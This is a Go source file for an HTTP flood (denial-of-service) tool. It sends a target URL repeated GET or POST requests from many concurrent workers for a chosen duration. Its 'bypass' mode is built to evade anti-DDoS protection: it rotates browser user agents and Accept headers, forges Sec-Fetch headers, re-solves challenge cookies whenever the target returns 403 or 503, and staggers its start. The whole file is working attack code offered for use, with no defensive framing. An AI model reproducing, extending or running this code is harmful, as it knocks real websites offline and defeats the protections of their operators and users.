package main

import (
	"bytes"
	crand "crypto/rand"
	"crypto/tls"
	"fmt"
	"math"
	"math/big"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
)

type Attacker struct {
	config Config
	attack Attack

	data      string
	request   *http.Request
	cookies   []Cookie
	userAgent string
}

func ParseAttack(attack Attack, config Config) {
	var attacker Attacker
	attacker.config = config
	attacker.attack = attack
	switch attack.AttackType {
	case "simple", "custom":
		attacker.DefaultAttack()
	case "bypass":
		attacker.BypassAttack()
	}
}

func (a *Attacker) SetUserAgent() {
	if a.attack.UserAgent == "" {
		a.userAgent = agents[rand.Intn(len(agents))]
	} else if a.attack.UserAgent == "chrome" {
		a.userAgent = chromeAgents[rand.Intn(len(chromeAgents))]
	} else if a.attack.UserAgent == "firefox" {
		a.userAgent = firefoxAgents[rand.Intn(len(firefoxAgents))]
	} else if a.attack.UserAgent == "edge" {
		a.userAgent = edgeAgents[rand.Intn(len(edgeAgents))]
	} else if a.attack.UserAgent == "opera" {
		a.userAgent = operaAgents[rand.Intn(len(operaAgents))]
	} else if a.attack.UserAgent == "safari" {
		a.userAgent = safariAgents[rand.Intn(len(safariAgents))]
	} else {
		a.userAgent = a.attack.UserAgent
	}
}

func (a *Attacker) SolveCookie() error {
	var err error
	var cookies []Cookie
	for i := 0; i < 3; i++ {
		cookies, err = GetCookies(a.attack.TargetURL, a.attack.CustomHeader, a.userAgent)
		if err != nil {
			fmt.Println(err)
			time.Sleep(time.Second * 3)
			continue
		}
		a.cookies = cookies
		return nil
	}
	return err
}

func (a *Attacker) RandomizeData() {
	var randomizedData string
	for i, data := range strings.Split(a.attack.Data, "&") {
		if data == "" {
			continue
		}
		name := strings.Split(data, "=")[0]
		value := strings.Split(data, "=")[1]
		if strings.Index(value, "%RAND%") == 0 {
			randomLength, err := strconv.Atoi(strings.Replace(value, "%RAND%", "", -1))
			if err != nil {
				return
			}
			value = RandomString(randomLength)
		}
		randomizedData += name + "=" + value
		if i != len(strings.Split(a.attack.Data, "&"))-1 {
			randomizedData += "&"
		}
	}
	a.data = randomizedData
}

func (a *Attacker) BuildRequest() error {
	var request *http.Request
	var err error
	if a.attack.Method == "POST" {
		request, err = http.NewRequest(a.attack.Method, a.attack.TargetURL, bytes.NewBuffer([]byte(a.data)))
		if err != nil {
			return err
		}
		request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	} else if a.attack.Method == "GET" {
		request, err = http.NewRequest(a.attack.Method, a.attack.TargetURL+"?"+a.data, nil)
		if err != nil {
			return err
		}
	} else {
		request, err = http.NewRequest(a.attack.Method, a.attack.TargetURL, nil)
		if err != nil {
			return err
		}
	}
	request.Header.Add("Connection", "keep-alive")
	if a.attack.AttackType == "bypass" && a.attack.Method == "GET" {
		request.Header.Add("DNT", "1")
		request.Header.Add("Upgrade-Insecure-Requests", "1")
	}
	request.Header.Add("User-Agent", a.userAgent)
	if a.attack.Method == "GET" {
		if a.attack.Accept == "" && a.attack.AttackType == "bypass" {
			if a.attack.UserAgent == "chrome" {
				request.Header.Add("Accept", chromeAccepts[rand.Intn(len(chromeAccepts))])
			} else if a.attack.UserAgent == "firefox" {
				request.Header.Add("Accept", firefoxAccepts[rand.Intn(len(firefoxAccepts))])
			} else if a.attack.UserAgent == "edge" {
				request.Header.Add("Accept", edgeAccepts[rand.Intn(len(edgeAccepts))])
			} else if a.attack.UserAgent == "opera" {
				request.Header.Add("Accept", operaAccepts[rand.Intn(len(operaAccepts))])
			} else if a.attack.UserAgent == "safari" {
				request.Header.Add("Accept", safariAccepts[rand.Intn(len(safariAccepts))])
			}
		} else if a.attack.Accept == "" {
			request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
		} else {
			request.Header.Add("Accept", a.attack.Accept)
		}
	}
	if a.attack.AttackType == "bypass" {
		request.Header.Add("Sec-Fetch-Site", "none")
		request.Header.Add("Sec-Fetch-Mode", "navigate")
		request.Header.Add("Sec-Fetch-User", "?1")
		request.Header.Add("Sec-Fetch-Dest", "document")
	}
	if a.attack.AcceptEncoding == "" {
		request.Header.Add("Accept-Encoding", acceptEncodings[rand.Intn(len(acceptEncodings))])
	} else {
		request.Header.Add("Accept-Encoding", a.attack.AcceptEncoding)
	}
	if a.attack.AcceptLanguage == "" {
		request.Header.Add("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
	} else {
		request.Header.Add("Accept-Language", a.attack.AcceptLanguage)
	}
	if len(a.cookies) > 0 {
		for _, cookie := range a.cookies {
			request.AddCookie(&http.Cookie{Name: cookie.Name, Value: cookie.Value})
		}
	}
	if a.attack.CustomHeader != "" && a.attack.AttackType != "bypass" {
		request.Header.Add(strings.Split(a.attack.CustomHeader, ": ")[0],
			strings.Split(a.attack.CustomHeader, ": ")[1])
	}
	a.request = request
	return nil
}

func (a *Attacker) DefaultAttack() {
	a.SetUserAgent()
	a.RandomizeData()
	err := a.BuildRequest()
	if err != nil {
		return
	}

	expired := make(chan bool)
	for i := 0; i < a.attack.Thread; i++ {
		go a.Worker(expired)
	}

	startTime := time.Now()
	for time.Now().Sub(startTime) <= time.Second*time.Duration(a.attack.Duration) {
		time.Sleep(time.Second)
	}
	for i := 0; i < a.attack.Thread; i++ {
		expired <- true
	}
}

func Equal(a, b []Cookie) bool {
	if len(a) != len(b) {
		return false
	}
	for i, v := range a {
		if v != b[i] {
			return false
		}
	}
	return true
}

func (a *Attacker) BypassAttack() {
	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
	rand.Seed(seed.Int64())
	time.Sleep(time.Second * time.Duration(rand.Intn(25)+5))
	a.SetUserAgent()
	err := a.SolveCookie()
	if err != nil {
		return
	}
	a.RandomizeData()
	err = a.BuildRequest()
	if err != nil {
		return
	}

	expired := make(chan bool)
	for i := 0; i < a.attack.Thread; i++ {
		go a.Worker(expired)
	}
	go a.CheckResponse(expired)

	lastCookie := a.cookies
	startTime := time.Now()
	for time.Now().Sub(startTime) <= time.Second*time.Duration(a.attack.Duration) {
		time.Sleep(time.Second)
		if !Equal(lastCookie, a.cookies) {
			a.RandomizeData()
			a.BuildRequest()
		}
	}
	for i := 0; i < a.attack.Thread+1; i++ {
		expired <- true
	}
}

func (a *Attacker) CheckResponse(expired chan bool) {
	exit := false
	go func() {
		exit = <-expired
	}()
	client := &http.Client{
		Transport: &http.Transport{
			Proxy:        nil,
			TLSNextProto: make(map[string]func(authority string, c *tls.Conn) http.RoundTripper),
		},
	}
	for {
		if exit {
			break
		}
		r, err := client.Do(a.request)
		if err != nil {
			time.Sleep(time.Second)
			continue
		}
		if r.StatusCode == 503 || r.StatusCode == 403 {
			a.SolveCookie()
		}
		r.Body.Close()
		time.Sleep(time.Second)
	}
}

func (a *Attacker) Worker(expired chan bool) {
	exit := false
	go func() {
		exit = <-expired
	}()
	client := &http.Client{
		Transport: &http.Transport{
			Proxy:        nil,
			TLSNextProto: make(map[string]func(authority string, c *tls.Conn) http.RoundTripper),
		},
	}
	for {
		if exit {
			break
		}
		r, err := client.Do(a.request)
		if err == nil {
			r.Body.Close()
		}
		time.Sleep(time.Millisecond * time.Duration(a.attack.Interval))
	}
}
